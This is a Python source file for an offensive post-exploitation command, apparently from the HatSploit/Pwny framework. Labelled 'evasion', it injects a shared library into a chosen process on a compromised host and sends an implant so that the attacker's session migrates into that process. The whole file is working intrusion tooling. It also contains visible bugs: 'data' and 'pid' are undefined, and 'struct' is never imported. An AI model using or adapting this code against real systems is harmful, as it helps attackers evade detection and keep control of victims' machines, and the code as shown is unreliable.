"""
This command requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny.api import *
from pwnt.types import *

from badges.cmd import Command

MIGRATE_CLONE = 1
MIGRATE_BASE = 5

MIGRATE_LOAD = tlv_custom_tag(API_CALL_STATIC, MIGRATE_BASE, API_CALL)


class ExternalCommand(Command):
    def __init__(self):
        super().__init__({
            'Category': "evasion",
            'Name': "migrate",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "Migrate into a process.",
            'MinArgs': 1,
            'Options': [
                (
                    ('pid',),
                    {
                        'help': 'Process ID to migrate to.',
                        'type': int,
                        'required': True
                    }
                ),
                (
                    ('-N', '--no-clone'),
                    {
                        'help': 'Do not inject to cloned thread.',
                        'action': 'store_true',
                        'dest': 'no_clone'
                    }
                )
            ]
        })

    def run(self, args):
        result = self.session.send_command(tag=PROCESS_GET_PID)
        curr_pid = result.get_int(TLV_TYPE_PID)

        self.print_process(f"Migrating to {str(args.pid)} from {str(curr_pid)}...")

        library = Pwny(
            target=self.session.details['Arch'].triplet).to_binary('so')

        if not library:
            self.print_error("Shared library was not found!")
            return

        self.print_process(f"Loading shared library ({str(len(data))} bytes)...")
        flags = 0

        if not args.no_clone:
            flags |= MIGRATE_CLONE

        tlv = self.session.send_command(
            tag=MIGRATE_LOAD,
            args={
                TLV_TYPE_PID: pid,
                TLV_TYPE_INT: flags,
                TLV_TYPE_BYTES: library
            }
        )

        if tlv.get_int(TLV_TYPE_STATUS) != TLV_STATUS_QUIT:
            self.print_error("Failed to load shared library!")
            return

        implant = Pwny(
            target=self.session.details['Arch'].triplet).to_binary('bin')

        self.print_process(f"Sending implant ({str(len(implant))} bytes)...")
        self.session.channel.client.send_raw(struct.pack('!I', len(implant)))
        self.session.channel.client.send_raw(implant)

        self.print_process("Waiting for process to rise...")
        self.session.open(self.session.channel.client)
        self.session.channel.secure = False
